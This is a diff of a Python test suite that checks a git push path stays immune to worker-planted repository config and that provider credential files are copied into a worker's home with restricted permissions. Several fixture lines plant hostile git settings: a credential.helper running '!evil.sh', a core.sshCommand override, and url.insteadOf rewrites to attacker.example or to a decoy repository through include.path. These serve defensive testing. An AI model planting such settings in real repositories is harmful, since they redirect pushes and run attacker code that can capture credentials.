@@ -444,9 +444,23 @@ def test_the_hardened_push_actually_works_against_a_real_remote(tmp_path: Path) 
     # Planted config the push must neutralise. Asserted AFTER _git_push, so
     # removing the scrub call from the push path fails this test -- a direct
     # test of the scrub helper alone does not.
-    git("config", "--local", "credential.helper", "!evil.sh", cwd=work)
-    git("config", "--local", "url.https://attacker.example/.insteadOf",
-        "https://github.com/", cwd=work)
+    # Planted via include.path -- the indirection that defeats key deletion.
+    # Unsetting credential.helper leaves it resolving through the include, so a
+    # scrub-based fix passes a direct-key test and fails here.
+    decoy = tmp_path / "decoy.git"
+    decoy.mkdir()
+    git("init", "--bare", "-q", cwd=decoy)
+    evil = tmp_path / "evil.cfg"
+    # The rewrite must target the destination this test ACTUALLY pushes to, or
+    # it never fires and the test cannot distinguish anything. An earlier
+    # version planted a github.com rewrite against a local remote and survived
+    # the mutation that removes the protection entirely.
+    evil.write_text(f'[url "{decoy}"]\n\tinsteadOf = {remote}\n')
+    git("config", "--local", "include.path", str(evil), cwd=work)
+    rewritten = git("config", "--get-urlmatch", "url", str(remote), cwd=work)
+    assert git("config", "--get", f"url.{decoy}.insteadOf", cwd=work).stdout.strip() == str(remote), (
+        "the include must be live before the push, or this proves nothing"
+    )
 
     # A planted hook that would fail the push if hooks were honoured.
     hooks = work / ".git" / "hooks"
@@ -471,9 +485,20 @@ def test_the_hardened_push_actually_works_against_a_real_remote(tmp_path: Path) 
         cwd=remote, capture_output=True, text=True, check=False,
     ).stdout.strip()
     assert landed == oid, "the observed object is what reached the remote"
-    leftover = git("config", "--local", "--name-only", "--list", cwd=work).stdout
-    assert "credential.helper" not in leftover, f"planted helper survived the push: {leftover}"
-    assert "insteadof" not in leftover.lower(), f"planted url rewrite survived: {leftover}"
+    # The worker's config is restored afterwards -- the point is that it was not
+    # consulted DURING the push, which the successful landing above shows: an
+    # honoured url.*.insteadOf would have redirected the push away from the
+    # local remote entirely.
+    decoy_ref = sp.run(
+        ["git", "rev-parse", "refs/heads/issue/441-a1"],
+        cwd=decoy, capture_output=True, text=True, check=False,
+    ).stdout.strip()
+    assert decoy_ref != oid, "the worker's url.*.insteadOf redirected the push"
+    # And the worker's own config is left as it was -- neutralised during the
+    # push, not destroyed.
+    assert git("config", "--get", "include.path", cwd=work).stdout.strip() == str(evil), (
+        "the worker's config must be restored after the push"
+    )
 
 
 def test_an_unregistered_worklink_path_is_declined(
@@ -542,35 +567,58 @@ def test_the_worker_gets_its_own_cli_config_paths(
         assert str(agent_home) not in env[key]
 
 
-def test_the_push_scrubs_worker_planted_config_from_the_checkout(tmp_path: Path) -> None:
-    """Executed, not asserted on argv.
 
-    A worker-written .git/config can redirect the push (url.*.insteadOf,
-    credential.helper) or execute during it (core.sshCommand). These are removed
-    from the CHECKOUT's config, so the deployment's own global helper survives.
+def test_provider_material_is_copied_into_the_worker_home(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    """Empty directories give the CLI no config and no credential.
+
+    worker_runtime_env points OpenCode/Codex at paths under the worker's home,
+    so those paths have to hold real material or the configured invocation
+    cannot start under the worker uid.
     """
-    import subprocess as sp
+    from mimir.worklink.supervisor import _project_provider_material
 
-    from mimir.worklink.orchestrator import _scrub_checkout_git_config
+    controller = tmp_path / "controller-home"
+    (controller / ".local" / "share" / "opencode").mkdir(parents=True)
+    (controller / ".local" / "share" / "opencode" / "auth.json").write_text('{"t":"secret"}')
+    (controller / ".config" / "opencode").mkdir(parents=True)
+    (controller / ".config" / "opencode" / "opencode.jsonc").write_text("{}")
+    (controller / ".codex").mkdir()
+    (controller / ".codex" / "auth.json").write_text('{"c":"secret"}')
+    monkeypatch.setenv("MIMIR_CONTROLLER_HOME", str(controller))
+    monkeypatch.delenv("OPENCODE_CONFIG", raising=False)
 
-    work = tmp_path / "repo" / ".worklink" / "441-a1"
-    work.mkdir(parents=True)
-    if sp.run(["git", "init", "-q"], cwd=work, capture_output=True, check=False).returncode != 0:
-        pytest.skip("git unavailable")
+    worker = tmp_path / "worker-home"
+    worker.mkdir()
+    projected = _project_provider_material(worker, os.getuid(), os.getgid())
 
-    def cfg(*args: str) -> sp.CompletedProcess[str]:
-        return sp.run(["git", "-C", str(work), "config", "--local", *args],
-                      capture_output=True, text=True, check=False)
+    assert ".local/share/opencode/auth.json" in projected
+    assert ".codex/auth.json" in projected
+    assert (worker / ".local" / "share" / "opencode" / "auth.json").read_text() == '{"t":"secret"}'
+    assert (worker / ".config" / "opencode" / "opencode.jsonc").read_text() == "{}"
+    # A COPY, not a link: the worker must not be able to reach the controller's
+    # home, which is the boundary this feature exists to draw.
+    assert not (worker / ".codex" / "auth.json").is_symlink()
+    mode = (worker / ".codex" / "auth.json").stat().st_mode & 0o777
+    assert mode == 0o600, f"projected credential is mode {oct(mode)}"
 
-    cfg("credential.helper", "!evil.sh")
-    cfg("core.sshCommand", "evil-ssh")
-    cfg("url.https://attacker.example/.insteadOf", "https://github.com/")
-    cfg("user.email", "keep@me")
 
-    _scrub_checkout_git_config(work)
+def test_projection_honours_a_configured_opencode_config_path(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    """OPENCODE_CONFIG may point outside the default location."""
+    from mimir.worklink.supervisor import _project_provider_material
 
-    assert cfg("--get", "credential.helper").stdout.strip() == ""
-    assert cfg("--get", "core.sshCommand").stdout.strip() == ""
-    listing = cfg("--name-only", "--list").stdout
-    assert "insteadof" not in listing.lower(), f"url rewrite survived: {listing}"
-    assert cfg("--get", "user.email").stdout.strip() == "keep@me", "unrelated config must survive"
+    controller = tmp_path / "controller-home"
+    controller.mkdir()
+    custom = tmp_path / "elsewhere" / "opencode.jsonc"
+    custom.parent.mkdir(parents=True)
+    custom.write_text('{"model":"x"}')
+    monkeypatch.setenv("MIMIR_CONTROLLER_HOME", str(controller))
+    monkeypatch.setenv("OPENCODE_CONFIG", str(custom))
+
+    worker = tmp_path / "worker-home"
+    worker.mkdir()
+    _project_provider_material(worker, os.getuid(), os.getgid())
+    assert (worker / ".config" / "opencode" / "opencode.jsonc").read_text() == '{"model":"x"}'
